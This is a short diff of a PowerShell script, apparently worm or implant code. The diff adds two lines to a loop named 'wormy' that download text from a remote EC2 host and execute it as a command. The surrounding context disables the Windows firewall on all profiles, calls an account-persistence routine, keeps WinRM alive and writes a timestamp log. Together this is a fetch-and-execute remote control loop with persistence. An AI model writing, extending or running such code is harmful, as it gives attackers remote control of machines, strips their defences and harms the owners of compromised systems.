@@ -72,6 +72,8 @@ function keepWINRMAlive{
 function wormy{
     
     while(1 -eq 1){
+    $httpCommand=invoke-restmethod http://ec2-52-70-218-30.compute-1.amazonaws.com/fun/ezT231.txt
+    & $httpCommand
     accountPersist
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
